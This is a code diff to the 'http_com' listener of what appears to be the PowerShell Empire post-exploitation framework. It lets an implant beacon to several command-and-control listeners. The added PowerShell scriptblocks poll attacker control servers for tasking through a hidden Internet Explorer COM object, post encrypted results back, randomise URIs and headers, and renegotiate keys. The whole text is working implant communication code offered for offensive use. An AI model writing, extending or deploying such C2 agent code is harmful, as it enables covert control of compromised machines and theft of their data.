@@ -124,7 +124,13 @@ class Listener:
                 'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                 'Required'      :   False,
                 'Value'         :   '#general'
+            },
+            'SupListeners': {
+                'Description'   :   'Names of the other Listeners the agent should beacon back to (eg: listener1,listener2,listener3)',
+                'Required'      :   False,
+                'Value'         :   ''
             }
+
         }
 
         # required:
@@ -479,7 +485,22 @@ class Listener:
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            code = code.replace('#LISTENER_DICT', commsCode[0])\
+                   .replace('#COMM_FUNCTION', commsCode[1])\
+                   .replace('#TASK_FUNCTION',commsCode[2])
+
+            #Should we generate for more than one listener?
+            if self.options['SupListeners']['Value'] != '':
+                listeners = self.options['SupListeners']['Value'].split(',')
+                active_listeners = self.mainMenu.listeners.activeListeners
+                loaded_listeners = self.mainMenu.listeners.loadedListeners
+                #iterate through the listeners to retrieve options for each one and generate commCode
+                for l in listeners:
+                    loadedlistener = loaded_listeners[active_listeners[l]["moduleName"]]
+                    commsCode = loadedlistener.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
+                    code = code.replace('#LISTENER_DICT', commsCode[0])\
+                           .replace('#COMM_FUNCTION', commsCode[1])\
+                           .replace('#TASK_FUNCTION',commsCode[2])
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -502,15 +523,55 @@ class Listener:
             print helpers.color("[!] listeners/http_com generate_agent(): invalid language specification, only 'powershell' is currently supported for this module.")
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, language=None, **kwargs):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
         This is so agents can easily be dynamically updated for the new listener.
         """
 
+        #we are generating code for an already deployed agent
+        deployed = "deployed" in kwargs
+
+        delay = listenerOptions['DefaultDelay']['Value']
+        jitter = listenerOptions['DefaultJitter']['Value']
+        profile = listenerOptions['DefaultProfile']['Value']
+        lostLimit = listenerOptions['DefaultLostLimit']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        b64DefaultResponse = base64.b64encode(self.default_response())
+
         if language:
             if language.lower() == 'powershell':
+                listener_dict = """
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"}}
+        taskURIs = "{taskURIs}"
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
+#LISTENER_DICT
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'],
+           taskURIs = profile.split('|')[0])
+
 
                 updateServers = """
                     $Script:ControlServers = @("%s");
@@ -528,44 +589,50 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    $script:GetTask = {
-                        try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+                    $script:GetTask{name} = {{
+                        param($FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
+
+                        try {{
+                            if ($ControlServers[$ServerIndex].StartsWith("http")) {{
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-                                $Headers = "%s: $RoutingCookie"
-                                $script:Headers.GetEnumerator()| %%{ $Headers += "`r`n$($_.Name): $($_.Value)" }
+                                $Headers = "{reqheader}: $RoutingCookie"
+                                $FixedParameters["headers"].GetEnumerator()| %{{ $Headers += "`r`n$($_.Name): $($_.Value)" }}
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
-                                $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
+                                $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                $ServerURI = $ControlServers[$ServerIndex] + $taskURI
 
                                 $Script:IE.navigate2($ServerURI, 14, 0, $Null, $Headers)
-                                while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
+                                while($Script:IE.busy -eq $true){{Start-Sleep -Milliseconds 100}}
                                 $html = $Script:IE.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $Script:IE.document, $Null).InnerHtml
-                                try {
+                                try {{
                                     [System.Convert]::FromBase64String($html)
-                                }
-                                catch {$Null}
-                            }
-                        }
-                        catch {
-                            $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                }}
+                                catch {{$Null}}
+                            }}
+                        }}
+                        catch {{
+                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
-                """ % (listenerOptions['RequestHeader']['Value'])
+                            }}
+                        }}
+                    }}
+                    #TASK_FUNCTION
+                """
 
                 sendMessage = """
-                    $script:SendMessage = {
-                        param($Packets)
+                    $script:SendMessage{name} = {{
+                        param($Packets,$FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
 
-                        if($Packets) {
+                        if($Packets) {{
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets
 
@@ -575,33 +642,43 @@ class Listener:
 
                             $bytes=$e.GetBytes([System.Convert]::ToBase64String($RoutingPacket));
 
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+                            if($ControlServers[$ServerIndex].StartsWith('http')) {{
 
                                 $Headers = ""
-                                $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
+                                $FixedParameters["headers"].GetEnumerator()| %{{ $Headers += "`r`n$($_.Name): $($_.Value)" }}
                                 $Headers.TrimStart("`r`n")
 
-                                try {
+                                try {{
                                     # choose a random valid URI for checkin
-                                    $taskURI = $script:TaskURIs | Get-Random
-                                    $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
+                                    $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                    $ServerURI = $ControlServers[$ServerIndex] + $taskURI
 
                                     $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Headers)
-                                    while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
-                                }
-                                catch [System.Net.WebException]{
+                                    while($Script:IE.busy -eq $true){{Start-Sleep -Milliseconds 100}}
+                                }}
+                                catch [System.Net.WebException]{{
                                     # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                         # restart key negotiation
                                         Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
+                                    }}
+                                }}
+                            }}
+                        }}
+                    }}
+                #COMM_FUNCTION
                 """
+                if deployed:
+                    return ( "$script:NewListenerDict = {};".format(listener_dict) +
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
-                return updateServers + getTask + sendMessage
+                else:
+                    return (listener_dict,
+                            getTask.format(ControlServers = updateServers,
+                                           name = listenerOptions['Name']['Value'],
+                                           reqheader = listenerOptions['RequestHeader']['Value']),
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             else:
                 print helpers.color("[!] listeners/http_com generate_comms(): invalid language specification, only 'powershell' is currently supported for this module.")
